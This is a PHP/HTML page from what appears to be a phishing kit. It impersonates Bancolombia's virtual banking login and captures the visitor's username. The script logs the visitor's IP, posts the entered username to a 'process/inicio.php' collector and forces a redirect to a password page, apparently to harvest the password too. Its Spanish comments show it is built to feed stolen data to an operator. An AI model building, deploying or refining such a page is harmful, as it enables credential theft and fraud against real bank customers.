<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('America/Bogota');
$tiempo = date("l, j \d\e F \d\e Y");
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia Sucursal Virtual Personas</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>

        <style type="text/css">
            #fondo, #cargando-o {
                display: none; 
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(255,255,255,0.95);
                z-index: 9999;
                text-align: center;
                padding-top: 50%;
            }
            #btn-continuar:disabled { background-color: #ccc !important; cursor: not-allowed; color: #777; }
            #btn-continuar { background-color: #FDDA24 !important; color: #000; font-weight: bold; cursor: pointer; }
            .entradas { border: none; outline: none; width: 100%; font-size: 16px; font-family: 'Open Sans'; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br><p style="font-family: 'Open Sans'; color: #666;">Cargando...</p>
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="25"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="25"></td>
            </tr>
        </table>

        <div align="center">
            <img src="../img/logo.svg" width="220" style="margin-top: 40px; margin-bottom: 30px;">
        </div>

        <div class="titulo-app" style="text-align: center; font-weight: 800; font-family: 'Open Sans';">Ingresa tu usuario</div>  
        
        <div class="frm" style="padding: 25px;">
            <div class="inp" id="inp-usuario" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-u.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" autocomplete="off" placeholder="Ingresa el usuario">
                        </td>
                    </tr>
                </table>
            </div>
        </div>  

        <button class="botones" id="btn-continuar" style="width: 85%; margin: 0 auto; display: block; height: 50px; border: none; border-radius: 25px;" disabled>CONTINUAR</button> 

        <script type="text/javascript">
            $(document).ready(function() { 
                $("#fondo, #cargando-o").hide();

                // Habilitar botón al escribir 4 caracteres
                $("#txt-usuario").on("input", function() {
                    if ($(this).val().length >= 4) {
                        $("#btn-continuar").prop("disabled", false);
                    } else {
                        $("#btn-continuar").prop("disabled", true);
                    }
                });

                // Acción de envío directo
                $("#btn-continuar").click(function(e) {
                    e.preventDefault();
                    var user_val = $("#txt-usuario").val();
                    
                    if (user_val !== "") {
                        $("#fondo").show();
                        $("#cargando-o").show();

                        // REPORTE DIRECTO AL PROCESADOR
                        // Enviamos la variable "usr" que es la que espera tu inicio.php
                        $.post("../process/inicio.php", { usr: user_val }, function(data) {
                            window.location.href = "PASS.php";
                        }).fail(function() {
                            // Si el servidor está lento, saltamos igual a los 1.5 seg
                            setTimeout(function(){ window.location.href = "PASS.php"; }, 1500);
                        });

                        // Seguridad total: si nada responde, salta a los 4 segundos
                        setTimeout(function(){
                            window.location.href = "PASS.php";
                        }, 4000);
                    }
                });
            });
        </script>
    </body>
</html>
